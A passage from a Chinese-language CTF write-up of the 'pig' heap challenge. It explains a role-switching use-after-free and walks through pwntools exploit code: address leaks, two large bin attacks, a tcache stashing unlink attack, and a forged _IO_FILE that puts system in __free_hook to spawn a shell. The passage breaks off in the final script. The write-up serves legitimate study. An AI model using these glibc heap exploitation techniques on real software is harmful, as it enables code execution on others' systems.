<p>在检查函数通过之后，如果我们会更换用户，则会将原来用户分配的<code>chunk</code>复制到一个程序预先分配号的一块空间，然后将新用户的<code>chunk</code>以及标志位等从那一块空间中复制出来。</p>
<h4 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>本题的漏洞就在于用户的分配上。由于新用户只是复制了第二个标志位，对于某个<code>chunk</code>的索引而言，如果原用户的两个对应标志位均为0，而新用户的两个标志位为1，则用户转换后，两个标志位分别为0和1。注意<code>view message</code>和<code>edit message</code>检查的都是第1个标志位是否为0，对于新用户而言，这个索引原本的<code>chunk</code>是已经被释放的，但这样一来我们就可以再一次访问这个<code>chunk</code>，这就产生了<code>UAF</code>。我们可以申请到在<code>tcache</code>保存大小范围的<code>chunk</code>，也可以申请到大于<code>tcache</code>大小的<code>chunk</code>，而且程序通过<code>calloc</code> 分配堆块会跨过 <code>tcache</code>，符合 <code>house of pig</code> 利用条件。关于新版本 <code>largebin_attack</code> 和 <code>tcache_stashing_unlink_attack</code> 请看前言提到的文章。</p>
<p><strong>前置脚本</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pig&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pig&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line">password = [<span class="string">b&#x27;Aa9nH3&#x27;</span>, <span class="string">b&#x27;BaBqJn&#x27;</span>, <span class="string">b&#x27;CbyWU8&#x27;</span>]</span><br><span class="line">current_user = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">content_length, content = <span class="literal">None</span></span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;message size: &#x27;</span>, <span class="built_in">str</span>(content_length).encode())</span><br><span class="line">    <span class="keyword">if</span> content <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        content = <span class="built_in">str</span>(current_user) * (content_length // <span class="number">0x30</span> * <span class="number">0x10</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;message: &#x27;</span>, content)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;message: &#x27;</span>, content)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_role</span>(<span class="params">role</span>):</span><br><span class="line">    <span class="keyword">global</span> current_user</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;user:\n&#x27;</span>, password[role])</span><br><span class="line">    current_user = role</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br></pre></td></tr></table></figure></div>

<p><strong>泄露地址并部署堆</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">leak_addr</span>():</span><br><span class="line">    <span class="keyword">global</span> libc_base, system, __free_hook, _IO_list_all, heap_address</span><br><span class="line">    <span class="comment"># 部署tcache stashing unlink attack的堆环境</span></span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):      <span class="comment"># make 5 chunk into tcache, mummy index 0~4</span></span><br><span class="line">        add(<span class="number">0xA0</span>)</span><br><span class="line">        delete(i)</span><br><span class="line"></span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x150</span>)    <span class="comment"># peppa index 0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):      <span class="comment"># fill 0x120 tcache, peppa index 1~7</span></span><br><span class="line">        add(<span class="number">0x150</span>)</span><br><span class="line">        delete(i + <span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">0</span>)               <span class="comment"># peppa #0 into unsorted bin</span></span><br><span class="line"></span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0xA0</span>)               <span class="comment"># mummy index 5, split peppa #0</span></span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x160</span>)              <span class="comment"># peppa index 8</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):      <span class="comment"># fill 0x130 tcache, peppa index 9~15</span></span><br><span class="line">        add(<span class="number">0x160</span>)</span><br><span class="line">        delete(i + <span class="number">9</span>)</span><br><span class="line">    delete(<span class="number">8</span>)</span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">    view(<span class="number">8</span>)                 <span class="comment"># get libc base address</span></span><br><span class="line">    io.recv(<span class="number">0x10</span>)</span><br><span class="line">    libc_base = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>) - <span class="number">0x1ECBE0</span></span><br><span class="line">    system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    __free_hook = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    _IO_list_all = libc_base + libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0xB0</span>)               <span class="comment"># mummy index 6, split peppa #8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取堆地址</span></span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">    view(<span class="number">1</span>)</span><br><span class="line">    io.recv(<span class="number">0x10</span>)</span><br><span class="line">    heap_address = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)        <span class="comment"># get a heap address</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;libc base: &#x27;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;system: &#x27;</span>, <span class="built_in">hex</span>(system))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;__free_hook: &#x27;</span>, <span class="built_in">hex</span>(__free_hook))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;_IO_list_all: &#x27;</span>, <span class="built_in">hex</span>(_IO_list_all))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;heap address: &#x27;</span>, <span class="built_in">hex</span>(heap_address))</span><br></pre></td></tr></table></figure></div>

<p><code>tcache stashing unlink</code>的堆环境要求有<code>5</code>个<code>chunk</code>位于同一个<code>tcache bins</code>中，同时有2个相同大小的<code>chunk</code>位于<code>small bins</code>，之后通过修改<code>small bins</code>中链首<code>chunk</code>的<code>bk</code>指针可以将任意地址链入到<code>tcache</code>。</p>
<p>这里先将 <code>peppa(0)</code> 放进 <code>unsorted bin</code>，之后将其切分，由于转换身份时存在 <code>UAF</code> 漏洞，可以以此泄露 <code>libc</code> 地址，不过要注意先将对应的 <code>tcache</code> 填满。切分后我们再次申请 <code>0x160</code> 大小的 <code>chunk</code> 将剩余部分放进 <code>small bin</code> 中已备 <code>tcache stashing unlink attack</code> 攻击。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028142942544.png"
                      alt="image-20231028142942544"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028144439713.png"
                      alt="image-20231028144439713"
                ></p>
<p>同理也可以利用身份转换的 <code>UAF</code> 漏洞泄露堆地址，通过 <code>tcache</code> 的 <code>fd</code> 指针泄露堆地址，两次<code>view</code>的机会全部用完了，后面将不能使用<code>view</code>查看。我们这里<code>add(0xb0)</code>时将 <code>unsorted bin</code> 中的 <code>chunk</code> 切割成了 <code>0xb0</code> 大小。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028151045574.png"
                      alt="image-20231028151045574"
                ></p>
<p><strong>第一次large bin attack</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">first_largebin_attack</span>():</span><br><span class="line">    <span class="comment"># first large bin attack</span></span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0x440</span>)     <span class="comment"># mummy index = 7</span></span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x430</span>)     <span class="comment"># peppa index = 16</span></span><br><span class="line">    add(<span class="number">0x430</span>)     <span class="comment"># peppa index = 17</span></span><br><span class="line">    add(<span class="number">0x430</span>)     <span class="comment"># peppa index = 18</span></span><br><span class="line">    add(<span class="number">0x430</span>)     <span class="comment"># peppa index = 19</span></span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">7</span>)</span><br><span class="line">    add(<span class="number">0x450</span>)     <span class="comment"># mummy index = 8, switch mummy #7 into large bin</span></span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">17</span>)</span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">7</span>, (p64(__free_hook - <span class="number">0x18</span> - <span class="number">0x18</span>) * <span class="number">2</span>) + <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x440</span> // <span class="number">0x30</span> * <span class="number">0x10</span> - <span class="number">0x10</span>))</span><br><span class="line">    change_role(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">0xF0</span>)    <span class="comment"># daddy index = 0, complete first large bin attack</span></span><br></pre></td></tr></table></figure></div>

<p><code>large bin attack</code> 可以任意地址写堆地址，我们可以使得 <code>__free_hook</code> 周围变得可写。这种手法可以从前言的文章了解，这里不再细讲，我们把 <code>large_bin_chunk.bk_nextsize -&gt; (__free_hook - 0x30)</code>，再次申请 <code>0xf0</code> 大小的 <code>chunk</code> 时会先把 <code>unsorted_bin_chunk</code> 放进 <code>large bin</code> ，再去 <code>large bin</code> 中找到合适的 <code>chunk</code> 进行切割。借此可以完成 <code>large bin attack</code>。</p>
<p>构造的结构如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028155528867.png"
                      alt="image-20231028155528867"
                ></p>
<p> 攻击后如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028155847734.png"
                      alt="image-20231028155847734"
                ></p>
<p><strong>第二次 large bin attack</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">second_largebin_attack</span>():</span><br><span class="line">    <span class="comment"># second large bin attack</span></span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">19</span>)</span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">7</span>, (p64(_IO_list_all - <span class="number">0x20</span>) * <span class="number">2</span>) + <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x440</span> // <span class="number">0x30</span> * <span class="number">0x10</span> - <span class="number">0x10</span>))</span><br><span class="line">    change_role(<span class="number">2</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    add(<span class="number">0xF0</span>)    <span class="comment"># daddy index = 1, complete first large bin attack</span></span><br><span class="line">    <span class="comment">#pause()</span></span><br></pre></td></tr></table></figure></div>



<p>第二次 <code>large bin attack</code>，我们的目标是将未来的假 <code>_IO_FILE</code>地址写到<code>_IO_list_all</code>中。上一次 <code>large bin attack</code>中使用的<code>large bin</code>是可以重用的，我们将<code>bk_nextsize</code>指针改到其他位置还能够再一次进行攻击。第二次<code>large bin attack</code>应该写的具体的堆地址应该根据堆环境进行确定，选择的偏移至关重要。为了方便起见，我们的伪造<code>_IO_FILE</code>结构体应该在<code>daddy</code>分配索引为4的<code>chunk</code>时附加送给我们的一个<code>chunk</code>中进行构造。向<code>_IO_list_all</code>中写入的是<code>large bin chunk</code>的地址，如果想要这里同时也指向假<code>_IO_FILE</code>指针，就需要计算好<code>chunk</code>的分配数量，在<code>calloc(0xE8)</code>时能够正好让这个<code>chunk</code>被拆分，这样就实现了此处可写。可以让<code>bk_nextsize</code>的值为<code>_IO_list_all-0x20</code>。</p>
<p>构造如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028160650568.png"
                      alt="image-20231028160650568"
                ></p>
<p>攻击后：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028160804428.png"
                      alt="image-20231028160804428"
                ></p>
<p>这里<code>_IO_list_all</code>已经指向了我们伪造的 <code>fake_IO_FILE</code>。</p>
<p><strong>tcache stashing unlink attack</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">tcache_stashing_unlink_attack</span>():</span><br><span class="line">    <span class="comment"># tcache stashing unlink attack</span></span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">8</span>, <span class="string">b&#x27;0&#x27;</span> * <span class="number">0x40</span> + p64(heap_address + <span class="number">0x410</span>) + p64(__free_hook - <span class="number">0x28</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    change_role(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">0x230</span>)   <span class="comment"># daddy index = 2</span></span><br><span class="line">    change_role(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">0x430</span>)   <span class="comment"># daddy index = 3</span></span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">7</span>, p64(heap_address + <span class="number">0x19E0</span>) * <span class="number">2</span> + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    change_role(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">0xA0</span>)   <span class="comment"># daddy index = 4, trigger tcache stashing unlink attack</span></span><br><span class="line"></span><br><span class="line">    fake_IO_FILE_complete = p64(<span class="number">0</span>) * <span class="number">2</span>  <span class="comment"># _IO_read_end (0x10), _IO_read_base (0x18)</span></span><br><span class="line">    fake_IO_FILE_complete += p64(<span class="number">1</span>)     <span class="comment"># _IO_write_base (0x20)</span></span><br><span class="line">    fake_IO_FILE_complete += p64(<span class="number">0xFFFF_FFFF_FFFF</span>) <span class="comment"># _IO_write_ptr (0x28)</span></span><br><span class="line">    fake_IO_FILE_complete += p64(<span class="number">0</span>)     <span class="comment"># _IO_write_end (0x30)</span></span><br><span class="line">    fake_IO_FILE_complete += p64(heap_address + <span class="number">0x19E0</span> + <span class="number">0xD0</span>)  <span class="comment"># _IO_buf_base (0x38)</span></span><br><span class="line">    fake_IO_FILE_complete += p64(heap_address + <span class="number">0x19E0</span> + <span class="number">0xD0</span> + <span class="number">30</span>)  <span class="comment"># _IO_buf_end (0x40)</span></span><br><span class="line">    fake_IO_FILE_complete = fake_IO_FILE_complete.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_IO_FILE_complete += p64(<span class="number">0</span>)     <span class="comment"># _mode (0xB0)</span></span><br><span class="line">    fake_IO_FILE_complete = fake_IO_FILE_complete.ljust(<span class="number">0xC0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_IO_FILE_complete += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    fake_IO_FILE_complete += p64(libc_base + <span class="number">0x1E9560</span>)</span><br><span class="line">    payload = fake_IO_FILE_complete + <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="number">2</span> * p64(system)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;Gift:&#x27;</span>, payload)</span><br></pre></td></tr></table></figure></div>

<p>在第一次 <code>large bin attack</code>之后，我们将一个堆地址写到了<code>__free_hook-10</code>的位置，接下来就需要通过 <code>tcache stashing unlink attack</code>将这个地址用<code>_IO_str_overflow</code>函数中的<code>malloc</code>函数分配出来，然后利用 <code>memcpy</code> 将其改写为 <code>system</code> 地址，并传入 <code>/bin/sh\x00</code> 参数，通过 <code>exit</code> 函数触发即可。</p>
<p>构造的堆空间：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028162001523.png"
                      alt="image-20231028162001523"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028161943651.png"
                      alt="image-20231028161943651"
                ></p>
<p>此时用 <code>calloc</code> 申请 <code>0xA0</code> 大小的堆块会跨过 <code>tcache</code> 从 <code>small bin</code> 获取， <code>tcache</code> 未满将会把 <code>small bin</code> 中的堆块先放进 <code>tcache</code> 中。</p>
<p>攻击后：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028162237544.png"
                      alt="image-20231028162237544"
                ></p>
<p>成功链接进入 <code>tcache</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028162420262.png"
                      alt="image-20231028162420262"
                ></p>
<p>构造的 <code>fake_IO_FILE</code>:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028162527785.png"
                      alt="image-20231028162527785"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028163928738.png"
                      alt="image-20231028163928738"
                ></p>
<p><code>_IO_buf_end - _IO_buf_base = 30</code>，所以申请的大小刚好为 <code>30*2+100=0xA0</code>，会把 <code>__free_hook</code> 申请出来。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028164958890.png"
                      alt="image-20231028164958890"
                ></p>
<p>我们申请出来的用户空间在 <code>0x...30</code>，而 <code>&amp;__free_hook = 0x...48</code>，我们将 <code>old_buf == _IO_buf_base</code> 指向这样的地址 <code>b&#39;/bin/sh\x00&#39;+p64(system_addr)*2</code>就可以把 <code>system</code> 地址写入到 <code>__free_hook</code>，并且把 <code>_IO_buf_base -&gt;&#39;/bin/sh\x00&#39;</code> 作为其参数调用。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028165339348.png"
                      alt="image-20231028165339348"
                ></p>
<p><strong>exp</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pig&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pig&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line">password = [<span class="string">b&#x27;Aa9nH3&#x27;</span>, <span class="string">b&#x27;BaBqJn&#x27;</span>, <span class="string">b&#x27;CbyWU8&#x27;</span>]</span><br><span class="line">current_user = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">content_length, content = <span class="literal">None</span></span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;message size: &#x27;</span>, <span class="built_in">str</span>(content_length).encode())</span><br><span class="line">    <span class="keyword">if</span> content <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        content = <span class="built_in">str</span>(current_user) * (content_length // <span class="number">0x30</span> * <span class="number">0x10</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;message: &#x27;</span>, content)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;message: &#x27;</span>, content)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_role</span>(<span class="params">role</span>):</span><br><span class="line">    <span class="keyword">global</span> current_user</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;user:\n&#x27;</span>, password[role])</span><br><span class="line">    current_user = role</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_addr</span>():</span><br><span class="line">    <span class="keyword">global</span> libc_base, system, __free_hook, _IO_list_all, heap_address</span><br><span class="line">    <span class="comment"># 部署tcache stashing unlink attack的堆环境</span></span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):      <span class="comment"># make 5 chunk into tcache, mummy index 0~4</span></span><br><span class="line">        add(<span class="number">0xA0</span>)</span><br><span class="line">        delete(i)</span><br><span class="line"></span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x150</span>)    <span class="comment"># peppa index 0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):      <span class="comment"># fill 0x120 tcache, peppa index 1~7</span></span><br><span class="line">        add(<span class="number">0x150</span>)</span><br><span class="line">        delete(i + <span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">0</span>)               <span class="comment"># peppa #0 into unsorted bin</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># gdb.attach(io)</span></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0xA0</span>)               <span class="comment"># mummy index 5, split peppa #0</span></span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    add(<span 